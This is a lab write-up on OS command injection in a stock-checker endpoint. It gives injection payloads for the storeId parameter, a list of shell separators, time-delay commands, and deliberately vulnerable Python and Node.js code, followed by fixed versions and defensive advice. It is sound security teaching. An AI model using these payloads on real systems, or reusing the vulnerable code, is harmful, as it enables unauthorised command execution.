# Summary – Lab 1: OS command injection (simple case)

## Lab Information
**Topic:** OS command injection  
**Difficulty:** Apprentice

## Lab Description
This lab’s product stock checker is vulnerable to OS command injection. The server-side code builds a shell command using user-supplied `productId` and `storeId` parameters and executes it. The raw output of the command is returned in the HTTP response. An attacker can exploit this behavior to inject arbitrary commands such as `whoami` and see their output directly in the response.

## Vulnerability Analysis
The application likely calls a system utility (for example, a stock-checking script or wrapper) and passes `productId` and `storeId` as arguments, but constructs the command string using naive string concatenation and invokes it through a shell. Because the input is not validated or safely passed as separate arguments, an attacker can use command separators (`;`, `&&`, `|`, backticks, `$()`, etc.) to break out of the intended command and execute arbitrary OS commands with the privileges of the web server process.

## Exploitation Steps
1. **Identify potential injection points**
   - `GET /product?productId=<id>`
   - `POST /product/stock` with body `productId=2&storeId=<id>`
2. **Fuzz the parameters using Burp Intruder (Sniper)**
   - Configure Intruder on `POST /product/stock` and target the `storeId` parameter.
   - Use a payload list such as Burp’s “Fuzzing – command injection” or `command_exec.txt` from PayloadAllTheThings.
3. **Detect command injection**
   - A payload like `storeId=1{base};echo 111111` (URL-encoded `1%7bbase%7d%3becho%20111111`) returns output containing:
     - Stock value (e.g. `87`)
     - The injected marker `111111`
   - A payload like `storeId=1'` yields a shell error: `sh: 1: Syntax error: Unterminated quoted string`.
   - Both responses indicate the user input is being passed into a shell command.
4. **Execute `whoami`**
   - Send: `productId=2&storeId=1;whoami`
   - The response body contains the stock-check output followed by the result of `whoami` (e.g. `peter-ID`).
5. **Verify successful exploitation**
   - Confirm that the command output is stable and returned directly by the application.

`productId` is also vulnerable parameter. See Detailed Walkthrough for details.

## Useful Payloads
```sh
-- these payloads also work for storeId=
1%26whoami
1%26%26whoami
1|whoami
1%7cwhoami

-- these payloads don't work for storeId=
1&whoami -- interpreted as another parameter
1&&whoami -- incorrect syntax
1+and+whoami -- incorrect syntax
1+AND+whoami -- incorrect syntax
1||whoami -- incorrect syntax
1%7c%7cwhoami -- incorrect syntax
```

## Payloads List
Time delay commands (for Linux)
```sh
sleep <seconds>
ping -i <seconds/iterations> 127.0.0.1
timeout 10 sh -c 'while true; do :; done'
timeout 10 bash -c 'echo done'
read -t 10 dummy
bash -c 'read -t 10 <> <(:)'
python -c "import time; time.sleep(10)"
php -r "usleep(10000000);"
php -r "time_nanosleep(10, 0);" 
```

Time delay commands (for Windows)
```sh
timeout /T 10 /NOBREAK >nul
ping 127.0.0.1 -n 11 >nul
powershell -Command "Start-Sleep -Seconds 10"
powershell -c "Start-Sleep 10"
```

## Separators List
```sh
;
|
||
&
&&
\n
`(payload)`
$(payload)
```


## AppSec Perspective

### What the underlying code might be
A likely vulnerable implementation in Python could be:

```python
import subprocess
from flask import request

def stock_route():
    product_id = request.values.get("productId", "")
    store_id = request.values.get("storeId", "")

    # VULNERABLE: user input concatenated into shell command
    cmd = f"/usr/local/bin/stockcheck {product_id} {store_id}"
    output = subprocess.check_output(cmd, shell=True, text=True)
    return output
```

Or in Node.js:

```javascript
const { exec } = require("child_process");

app.post("/product/stock", (req, res) => {
  const productId = req.body.productId;
  const storeId = req.body.storeId;

  // VULNERABLE
  const cmd = `/usr/local/bin/stockcheck ${productId} ${storeId}`;
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      return res.status(500).send("Error");
    }
    res.type("text/plain").send(stdout);
  });
});
```

### Security issues enabling exploitation
- **Shell invocation with untrusted data** (`shell=True`, `exec()` of a string).
- **String concatenation / interpolation of user input** into OS commands.
- **No input validation or allow-listing** on `productId` or `storeId`.
- **Exposing raw command output** to the user, making exploitation trivial.
- **Over-privileged runtime user** (e.g. web server running as a powerful system user).

### How to fix it
1. **Avoid the shell entirely (primary fix)**  
   - Use safe APIs that pass arguments as a list and do not invoke a shell:
   ```python
   cmd = ["/usr/local/bin/stockcheck", product_id, store_id]
   output = subprocess.check_output(cmd, shell=False, text=True)
   ```
   - In Node.js, use `spawn`/`execFile` with an array of arguments and no shell.

2. **Apply strict input validation / allow-listing**
   - `productId` and `storeId` should be numeric or selected from known identifiers.
   - Enforce type and range constraints server-side (e.g. only digits, length limits).

3. **Least privilege & separation of duties**
   - Run the web application under an account with minimal OS privileges.
   - If possible, isolate the stock-checking logic in a separate service, not via shell.

4. **Do not return raw command output**
   - Parse and return only structured data needed by the client (e.g. JSON with stock count).
   - Sanitize data output to prevent XSS
   - Log diagnostic details internally instead of sending them to users.

### Safe code version
Python safe version
```python
import subprocess
from flask import request, abort

def stock_route():
    # 1. Extract and normalize input
    product_id = (request.values.get("productId") or "").strip()
    store_id = (request.values.get("storeId") or "").strip()

    # 2. Strong validation / allow-list style
    #    Here we assume IDs must be positive integers.
    if not product_id.isdigit() or not store_id.isdigit():
        abort(400, description="Invalid product or store id")

    # Optionally convert to int and enforce business rules / ranges
    # product_id_int = int(product_id)
    # store_id_int = int(store_id)
    # if product_id_int <= 0 or store_id_int <= 0:
    #     abort(400, description="Invalid product or store id")

    # 3. Call external program without a shell
    #    - Passing a list -> no shell
    #    - shell=False (default when cmd is a list) -> no shell interpretation
    cmd = ["/usr/local/bin/stockcheck", product_id, store_id]

    try:
        output = subprocess.check_output(cmd, shell=False, text=True)  # shell=False by default
    except subprocess.CalledProcessError as e:
        # Log e if needed, but don't leak details to the client
        abort(500, description="Stock lookup failed")

    # 4. Return sanitized / expected output (here, plain text for the lab)
    return output
```

JS safe version
```javascript
const { execFile } = require("child_process");

app.post("/product/stock", (req, res) => {
  // 1. Extract and normalize
  const productId = String(req.body.productId || "").trim();
  const storeId = String(req.body.storeId || "").trim();

  // 2. Strong validation / allow-list
  //    Assume IDs must be positive integers.
  const numericRegex = /^\d+$/;
  if (!numericRegex.test(productId) || !numericRegex.test(storeId)) {
    return res.status(400).send("Invalid product or store id");
  }

  // 3. Use execFile (no shell), arguments as an array
  execFile("/usr/local/bin/stockcheck", [productId, storeId], (err, stdout, stderr) => {
    if (err) {
      // Log internally, but don't leak details
      console.error("stockcheck failed:", err);
      return res.status(500).send("Error");
    }

    // 4. Return expected/plain output
    res.type("text/plain").send(stdout);  // no HTML content, XSS risk is minimal
    // or use something like this if it's imbeded into HTML
    // res.safe_output().type("text/plain").send(stdout);
  });
});
```

## Key Takeaways

**Lessons from Attacker perspective**
- Fuzz parameters feeding server-side utilities; look for shell error messages and echoed markers.
- Command separators (`;`, `&&`, `|`, backticks, `$()`) are powerful probes for OS command injection.
- Direct output in the response dramatically simplifies exploitation and post-exploitation.

**Lessons from AppSec (defender) perspective**
- Treat any OS command execution as a high-risk operation; avoid it where possible (Remove shell usage in business logic; use high-level libraries that do not expose OS commands).
- Never pass untrusted input into a shell; use parameterized process APIs with allow-listed arguments.
- Apply least privilege and avoid exposing raw backend or OS-level output to clients.
